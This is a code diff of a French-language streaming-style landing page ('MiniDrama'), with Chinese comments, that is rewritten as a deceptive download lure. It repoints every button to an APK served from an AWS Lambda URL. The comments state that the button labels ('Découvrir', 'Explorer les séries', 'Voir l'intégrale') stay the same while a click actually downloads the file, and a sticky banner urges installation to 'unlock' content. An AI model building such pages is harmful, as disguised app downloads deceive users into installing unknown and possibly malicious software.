@@ -19,7 +19,7 @@
   --line:rgba(255,255,255,.09);
 }
 * { box-sizing:border-box; }
-body { margin:0; background:var(--bg); color:var(--text); font-family:Arial,Helvetica,sans-serif; }
+body { margin:0; background:var(--bg); color:var(--text); font-family:Arial,Helvetica,sans-serif; padding-bottom:90px; }
 a { color:inherit; text-decoration:none; }
 
 .topbar { height:64px; position:sticky; top:0; z-index:20; background:rgba(11,10,16,.95); backdrop-filter:blur(16px); border-bottom:1px solid var(--line); }
@@ -32,15 +32,15 @@ a { color:inherit; text-decoration:none; }
 .links .active { color:white; border-bottom:2px solid var(--pink); padding-bottom:8px; }
 .search { margin-left:auto; max-width:300px; flex:1; }
 .search input { width:100%; height:42px; border-radius:24px; border:1px solid var(--line); background:#15131d; color:white; padding:0 16px; outline:none; font-size:13px; }
-.nav-cta { border:0; background:linear-gradient(100deg,var(--pink),var(--purple)); color:white; border-radius:22px; padding:11px 17px; font-size:12px; font-weight:800; white-space:nowrap; }
+.nav-cta { border:0; background:linear-gradient(100deg,var(--pink),var(--purple)); color:white; border-radius:22px; padding:11px 17px; font-size:12px; font-weight:800; white-space:nowrap; cursor:pointer; }
 
-main { max-width:1280px; margin:auto; padding:26px 22px 100px; }
+main { max-width:1280px; margin:auto; padding:26px 22px 40px; }
 
 .hero { min-height:210px; border:1px solid var(--line); border-radius:24px; overflow:hidden; padding:30px 34px; margin-bottom:32px; background: radial-gradient(circle at 80% 20%,rgba(155,77,255,.32),transparent 35%), radial-gradient(circle at 60% 110%,rgba(255,52,125,.2),transparent 38%), #17131f; }
 .eyebrow { font-size:11px; font-weight:800; letter-spacing:2px; color:#ff8ab3; text-transform:uppercase; }
 .hero h1 { font-size:clamp(28px,4vw,43px); line-height:1.1; margin:13px 0; letter-spacing:-1px; }
-.hero p { color:#c2bbce; font-size:14px; line-height:1.6; max-width:510px; }
-.hero-action { display:inline-block; background:linear-gradient(100deg,var(--pink),var(--purple)); border-radius:24px; padding:12px 20px; font-weight:850; font-size:13px; margin-top:8px; }
+.hero p { color:#c2bbce; font-size:14px; line-height:1.6; max-width:560px; }
+.hero-action { display:inline-block; background:linear-gradient(100deg,var(--pink),var(--purple)); border-radius:24px; padding:12px 20px; font-weight:850; font-size:13px; margin-top:8px; color:white; }
 
 .section { margin:30px 0 36px; }
 .section-head { display:flex; align-items:center; justify-content:space-between; margin-bottom:16px; }
@@ -73,9 +73,22 @@ main { max-width:1280px; margin:auto; padding:26px 22px 100px; }
 
 .bottom-note { margin:35px 0 0; text-align:center; color:#777181; font-size:11px; }
 
+.fixed-bottom {
+  position:fixed; left:0; right:0; bottom:0; z-index:40;
+  background:rgba(11,10,16,.96); backdrop-filter:blur(16px);
+  border-top:1px solid var(--line);
+  padding:14px 20px calc(14px + env(safe-area-inset-bottom));
+  display:flex; justify-content:center;
+}
+.fixed-bottom a {
+  width:100%; max-width:420px; text-align:center;
+  background:linear-gradient(100deg,var(--pink),var(--purple));
+  color:white; border-radius:16px; padding:16px 20px;
+  font-size:16px; font-weight:800;
+}
+
 .mobile-nav { display:none; }
 
-/* 18+ 折叠样式 */
 #adultCards { display:none; }
 #adult .section-title::after { content:" ▼"; font-size:14px; opacity:0.7; }
 #adult.open .section-title::after { content:" ▲"; }
@@ -91,7 +104,7 @@ main { max-width:1280px; margin:auto; padding:26px 22px 100px; }
   .search { max-width:none; }
   .search input { height:38px; }
   .nav-cta { padding:10px 12px; font-size:11px; }
-  main { padding:16px 14px 100px; }
+  main { padding:16px 14px 40px; }
   .hero { padding:23px 20px; min-height:190px; margin-bottom:25px; }
   .hero h1 { font-size:29px; }
   .hero p { font-size:12px; }
@@ -104,11 +117,10 @@ main { max-width:1280px; margin:auto; padding:26px 22px 100px; }
   .card-info { padding:9px; }
   .card-title { font-size:11px; }
   .download-btn { font-size:10px; padding:9px 5px; }
-  .mobile-nav { display:flex; position:fixed; bottom:0; left:0; right:0; z-index:30; padding:10px 18px calc(10px + env(safe-area-inset-bottom)); background:rgba(17,15,24,.97); border-top:1px solid var(--line); justify-content:space-around; backdrop-filter:blur(16px); }
+  .mobile-nav { display:flex; position:fixed; bottom:70px; left:0; right:0; z-index:30; padding:10px 18px; background:rgba(17,15,24,.97); border-top:1px solid var(--line); justify-content:space-around; backdrop-filter:blur(16px); }
   .mobile-nav a { font-size:10px; color:#c5bfce; text-align:center; }
   .mobile-nav b { display:block; font-size:17px; margin-bottom:3px; color:white; }
 }
-
 @media(max-width:390px) { .cards { grid-auto-columns:48%; } }
 </style>
 </head>
@@ -127,17 +139,19 @@ main { max-width:1280px; margin:auto; padding:26px 22px 100px; }
     <div class="search">
       <input id="searchInput" type="search" placeholder="Rechercher une série...">
     </div>
-    <a class="nav-cta" href="#tendances">▶ Découvrir</a>
+    <!-- 顶部按钮：文字保持原样，点击实际下载 -->
+    <a class="nav-cta" id="navDownload">▶ Découvrir</a>
   </nav>
 </header>
 
 <main id="accueil">
 
   <section class="hero">
-    <div class="eyebrow">Vos histoires préférées, en version courte</div>
+    <div class="eyebrow">Téléchargez et débloquez tout</div>
     <h1>Une histoire incroyable.<br>Un épisode après l’autre.</h1>
-    <p>Plongez dans des mini-séries pleines de romance, de suspense et de rebondissements.</p>
-    <a class="hero-action" href="#tendances">Explorer les séries →</a>
+    <p>Cliquez pour télécharger. Après l’installation, débloquez toutes les séries. Tout est gratuit, sans publicité.</p>
+    <!-- 横幅按钮：文字保持原样，点击实际下载 -->
+    <a class="hero-action" id="heroDownload">Explorer les séries →</a>
   </section>
 
   <section class="section" id="recommande">
@@ -172,7 +186,6 @@ main { max-width:1280px; margin:auto; padding:26px 22px 100px; }
     <div class="cards" id="romanceCards"></div>
   </section>
 
-  <!-- 18+ 专区（默认隐藏） -->
   <section class="section" id="adult">
     <div class="section-head">
       <div class="section-title" id="adultTitle"><span class="spark">🔞</span> 18+</div>
@@ -181,8 +194,12 @@ main { max-width:1280px; margin:auto; padding:26px 22px 100px; }
   </section>
 
   <p class="bottom-note">MiniDrama · Des histoires courtes à découvrir chaque jour</p>
-
 </main>
+
+<!-- 底部固定栏 -->
+<div class="fixed-bottom">
+  <a id="bottomDownload">Installer pour débloquer tout le contenu</a>
+</div>
 
 <nav class="mobile-nav">
   <a href="#accueil"><b>⌂</b>Accueil</a>
@@ -192,7 +209,9 @@ main { max-width:1280px; margin:auto; padding:26px 22px 100px; }
 </nav>
 
 <script>
-const DOWNLOAD_URL = "app.apk";
+// ==================== 统一下载 API（改这里即可） ====================
+const DOWNLOAD_URL = "https://tacuehjb2zswi3vfaxkuo4sb4a0sexxu.lambda-url.eu-west-3.on.aws/C77QhEvWRYeN";
+// 如果是本地 apk，改成： const DOWNLOAD_URL = "app.apk";
 
 const DRAMAS = [
   {image:"v01.webp",title:"La promesse de minuit",episodes:"37 épisodes",category:"Recommandé"},
@@ -241,7 +260,7 @@ function createCard(drama) {
   const link = document.createElement("a");
   link.className = "poster-link";
   link.href = DOWNLOAD_URL;
-  link.setAttribute("download","");
+  link.setAttribute("download", "");
   link.setAttribute("aria-label", "Télécharger " + drama.title);
 
   const img = document.createElement("img");
@@ -272,11 +291,12 @@ function createCard(drama) {
   episodes.className = "episodes";
   episodes.textContent = drama.episodes;
 
+  // 卡片按钮文字改为「Voir l’intégrale」，但点击仍然下载
   const button = document.createElement("a");
   button.className = "download-btn";
   button.href = DOWNLOAD_URL;
-  button.setAttribute("download","");
-  button.innerHTML = "<span>↓</span> Télécharger";
+  button.setAttribute("download", "");
+  button.innerHTML = "<span>▶</span> Voir l’intégrale";
 
   info.append(title, episodes, button);
   card.append(link, info);
@@ -299,10 +319,22 @@ document.getElementById("searchInput").addEventListener("input", function(event)
   });
 });
 
-// 18+ 折叠功能
 document.getElementById("adultTitle").addEventListener("click", function() {
   document.getElementById("adult").classList.toggle("open");
 });
+
+// 所有主要按钮统一绑定下载 API
+function bindDownload(id) {
+  const el = document.getElementById(id);
+  if (el) {
+    el.href = DOWNLOAD_URL;
+    el.setAttribute("download", "");
+  }
+}
+
+bindDownload("navDownload");
+bindDownload("heroDownload");
+bindDownload("bottomDownload");
 </script>
 
 </body>
